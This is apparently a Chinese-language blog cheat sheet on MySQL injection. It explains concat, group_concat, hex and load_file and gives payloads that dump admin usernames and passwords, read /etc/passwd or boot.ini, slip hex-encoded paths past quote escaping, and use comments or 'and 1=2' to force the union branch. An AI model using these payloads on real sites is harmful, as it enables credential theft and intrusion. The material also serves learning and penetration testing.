---
title: "Mysql"
date: 2016-01-26 18:49
---


# MySQL注入中常用的一些参数。


* 注入语句的格式为：参数的使用位置为上述语句中的 XO 位置

```
union+select+1,2,3,XO,4,...n+from+XXOO
```


* concat()

联合数据。和联合函数union不同，union用于联合两条SQL语句，这个用于联合两条数据结果。通常是联合两个字段名，在错误回显注入法中，这个函数会联合更复杂的。
数据库中管理员通常有登录名和密码等多个字段，用concat轻松一次注入出来。例如concat(username,0x3a,password)，不同字段用逗号 , 隔开，中间加一个hex编码值。
冒号进行hex编码得到0x3a，放在concat里面注入以后就显示冒号，常用的有 ** 0x3a,0x5c,0x5f,0x3c62723e **等

* group_concat()
用法与上面类似，通常格式如下：group_concat(DISTINCT+user,0x3a,password)，group_concat顾名思义，如果管理员账号不止一个的话，concat一次只能注入出来一个，使用group_concat把多条数据一次注入出来。

* concat_ws()

用法类似

* hex()和unhex()

有一些注入点由于数据库中对数据字段的类型定义，可能不支持union来显示某些不同类型的内容，所以使用hex对数据进行hex编码，例如union+select+hex(password)+from+mysql.user
注入出来的数据全都是0x1234567890abcdef类似的数据，使用winhex等工具转换回编码即可
hex参数可用于任何参数外面，hex(concat(xxoo))，hex(user()),hex(database())

* load_file()

这是MySQL以文本方式读取文件的参数，例如：linux系统的网站load_file('/etc /passwd')或者windows系统的网站load_file('c:\\boot.ini')
这个参数可以用的前提是，你user()得到的用户名，在mysql.user表中的字段file_priv设置为Y，则load_file()参数则可用
需要注意的是，如果为windows系统，保险起见将路径设置为双斜杠\\ 因为在计算机语言中双斜杠才是单斜杠的意思，如果为单斜杠，例如d:\table，那么这个路径中得\t就会被解析为键盘上的tab键，\n\r类似，最终得不到想要的结果
很多时候，php的网站的gpc会设置为on（就是对特殊字符做修改，例如单引号'自动修改为\'），那么load_file('c:\\boot.ini')就变成：load_file(\'c:\\\\boot.ini\')出现语法错误，得不到结果
解决方法就是，和concat参数一样，hex混用，将c:\\boot.ini进行hex编码，得到：0x633a5c5c626f6f742e696e69，原语句修改为：union+select+1,load_file(0x633a5c5c626f6f742e696e69)即可
使用load_file参数后面可以不加from


** 关于几点需要注意：**

* 注入时，猜字段爆数据，有时候会遇到在原始语句后面加一些语句例如order by,desc等等，例如

```
SELECT 1,2,3,4 FROM news where id=1 ORDER BY date DESC
```

注入语句以后：

```
select 1,2,3,4 from news where id=1 union select 1,2,3,4 from admin order by date DESC
```

注入都会提示错误。所以，通常注入的时候，在语句最后加一个--横杠或者/*注释符，结束后面的语句

```
news.php?id=1+union+select+1,2,3,4+from+admin--
news.php?id=1+union+select+1,2,3,4+from+admin/*
```

* 注入时，union联合了前面和后面两个语句，系统到底执行哪个呢？只要前面那个出现了逻辑错误，union一定执行后面一个注入的SQL语句

制造逻辑错误

```
news.php?id=1 and 1=2
news.php?id=-1
```